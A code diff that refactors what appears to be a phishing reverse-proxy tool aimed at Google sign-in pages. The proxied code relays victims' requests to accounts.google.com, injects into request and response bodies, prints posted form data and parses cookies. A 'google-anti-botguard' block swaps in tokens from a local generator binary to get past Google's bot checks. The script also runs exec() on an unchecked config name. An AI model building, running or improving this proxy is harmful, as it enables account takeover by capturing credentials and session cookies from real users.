@@ -1,20 +1,23 @@
-#! /usr/bin/env python3
- 
-# from os import execlpe
+#!/usr/bin/env python3
+
 import subprocess
-import requests, json, time, re
+import requests
+import json
+import time
+import re
 from datetime import datetime
 from sys import exit, platform
-import argparse, logging, ssl
+import argparse
+import logging
+import ssl
 from http.cookies import SimpleCookie
 from helper import *
-from http.server import HTTPServer,BaseHTTPRequestHandler
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-# from urllib.parse import unquote, quote_plus
 
-VERSION = 'v1.5'
+VERSION = 'v2024.6'
 CONFIG = ''
 LEVEL = ''
 
@@ -30,9 +33,9 @@ def banner():
       \___| |___|  |_|    |_||_| |___| |_|_\     \___| |___|  |_|\_| /_/\_\                                    
     '''+RED+'''  ====================================================================='''
     by = '''
-	+-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+	
-	|C| |i| |p| |h| |e| |r| |a| |s|
-	+-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+'''
+    +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+    
+    |C| |i| |p| |h| |e| |r| |a| |s|
+    +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+'''
     print(GREEN + bnr + RESET)
     print(CYAN + '\tCreated by: ' + GREEN + by + RESET)
     print(CYAN + '\tVersion:  -~{ ' + RED + VERSION +  CYAN + ' }~-\n' + RESET)
@@ -163,7 +166,6 @@ def parseCookie(cookie):
         logging.debug(e, exc_info=True)
 
 class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
-    # protocol_version = 'HTTP/2.0' 
     s = requests.Session()
     
     def do_HEAD(self):
@@ -180,17 +182,14 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
                         for k,v in _[1].items():
                             if k=='Host': hn=v
             url = 'https://' + hn + self.path.replace(domain,hostname.split('.',1)[1])
-            # Parse request
-            print('\n//'+self.command)
+            print('\n//' + self.command)
             print(LIGHTGREEN + url + RESET)
             req_header = self.parseHeaders()
-            # Call the target hostname
-            resp = self.s.get(url, headers=injectHeaders(req_header, url, self.headers['Content-Length'], self.path), verify=False, allow_redirects=True,)
+            resp = self.s.get(url, headers=injectHeaders(req_header, url, self.headers['Content-Length'], self.path), verify=False, allow_redirects=True)
             sent = True
             if resp.history:
                 for r in resp.history:
-                    print('Redirection: '+BOLD+CYAN+'[',r.status_code,'] ',r.url, RESET)
-            # Respond with the requested data
+                    print('Redirection: ' + BOLD + CYAN + '[', r.status_code, '] ', r.url, RESET)
             self.sendRespHeaders(resp)
             if body:
                 inj_resp = injectRespBody(resp.content, self.path)
@@ -204,9 +203,7 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
         except Exception as e:
             logging.error(RED + str(e))
             logging.debug(e, exc_info=True)
-            # exit()
         finally:
-            # self.finish()
             if not sent:
                 self.send_error(200, 'No Content')
                 logging.info('sending [200] with no content to target')
@@ -214,7 +211,7 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
     def do_POST(self, body=True):
         sent = False
         try:
-            logging.info('path::'+self.path)
+            logging.info('path::' + self.path)
             if blockPaths(self.path): return
             hn = hostname
             for _ in req_headers:
@@ -222,34 +219,25 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
                         for k,v in _[1].items():
                             if k=='Host': hn=v
             url = 'https://' + hn + self.path.replace(domain,hostname.split('.',1)[1])
-            # Parse request
-            print('\n//'+self.command)
+            print('\n//' + self.command)
             print(LIGHTGREEN + url + RESET)
             req_header = self.parseHeaders()
-            # content-length injection
-            if self.headers['Content-Length'] == None:
-                content_len = 0
-            else:
-                content_len = int(self.headers['Content-Length'])
+            content_len = int(self.headers['Content-Length']) if self.headers['Content-Length'] else 0
             post_body = self.rfile.read(content_len)
             print(GREEN, post_body, RESET)
-            ## google-anti-botguard
             if '/accountlookup' in self.path:
-                token = requests.get("http://localhost:8081?e="+re.findall('f.req=%5B%22.*?%22',str(post_body))[0].split('%22')[1]).text
-                post_body = re.sub(b'identifier%22%2C%22%3C.*%22', b'identifier%22%2C%22%3C'+bytes(token,encoding='utf8')+b'%22', post_body)
-            ##
+                token = requests.get("http://localhost:8081?e=" + re.findall('f.req=%5B%22.*?%22', str(post_body))[0].split('%22')[1]).text
+                post_body = re.sub(b'identifier%22%2C%22%3C.*%22', b'identifier%22%2C%22%3C'+bytes(token, encoding='utf8')+b'%22', post_body)
             injbody = injectReqBody(post_body, self.path)
-            # Call the target hostname
-            resp = self.s.post(url, data=injbody, headers=injectHeaders(req_header, url, str(len(injbody)), self.path), verify=False,)
+            resp = self.s.post(url, data=injbody, headers=injectHeaders(req_header, url, str(len(injbody)), self.path), verify=False)
             sent = True
             if resp.history:
                 for r in resp.history:
-                    print('Redirection: ' +BOLD+CYAN+ '[',r.status_code,'] ',r.url, RESET)
+                    print('Redirection: ' + BOLD + CYAN + '[', r.status_code, '] ', r.url, RESET)
             print(BGGREEN + str(resp.content) + RESET)
-            # Respond with the requested data 
             self.sendRespHeaders(resp)
             if body:
-                inj_resp = injectRespBody(resp.content,self.path)
+                inj_resp = injectRespBody(resp.content, self.path)
                 print(BGBLUE + str(inj_resp) + RESET)
                 self.send_header('Content-Length', len(inj_resp))
                 self.end_headers()
@@ -261,9 +249,7 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
         except Exception as e:
             logging.error(RED + str(e))
             logging.debug(e, exc_info=True)
-            # exit()
         finally:
-            # self.finish()
             if not sent:
                 self.send_error(200, 'No Content')
                 logging.info('sending [200] with no content to target')
@@ -290,17 +276,18 @@ class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):
                     parseCookie(v)
                
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
-  """ Make our HTTP server multi-threaded """
+    """ Make our HTTP server multi-threaded """
 
 def runServer():
     try:
         logging.captureWarnings(True)
         logging.info('HTTP server is starting on port ' + str(port))
         server_address = (server, port)
-        # httpd = HTTPServer(server_address, ProxyHTTPRequestHandler)
         httpd = ThreadedHTTPServer(server_address, ProxyHTTPRequestHandler)
         if isSSL:
-            httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='cert/server.pem')
+            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            context.load_cert_chain(certfile='cert/server.pem')
+            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
         if hostname=="accounts.google.com":
             subprocess.Popen(['bin/generate.exe']) if platform=='win32' else subprocess.Popen(['bin/generate'])
         logging.info('HTTP server is running as reverse proxy')
@@ -319,17 +306,13 @@ def runServer():
 if __name__ == '__main__':
     cwin()
     flags()
-    if LEVEL=='error':
-        logging.basicConfig(format=PURPLE + '## %(asctime)s [%(levelname)s] - %(message)s' + RESET, level=logging.ERROR,)
-    elif LEVEL=='debug':
-        logging.basicConfig(format=PURPLE + '## %(asctime)s [%(levelname)s] - %(message)s' + RESET, level=logging.DEBUG,)
-    else:
-        logging.basicConfig(format=PURPLE + '## %(asctime)s [%(levelname)s] - %(message)s' + RESET, level=logging.INFO,)
+    logging_level = {'error': logging.ERROR, 'debug': logging.DEBUG, 'info': logging.INFO}.get(LEVEL, logging.INFO)
+    logging.basicConfig(format=PURPLE + '## %(asctime)s [%(levelname)s] - %(message)s' + RESET, level=logging_level)
     banner()
     checkUpdate()
     try:
         logging.info('loading config ' + CONFIG)
-        exec('from config.' + CONFIG + ' import *')
+        exec(f'from config.{CONFIG} import *')
     except Exception as e:
         logging.error(RED + 'no such config found' + RESET)
         logging.debug(e, exc_info=True)
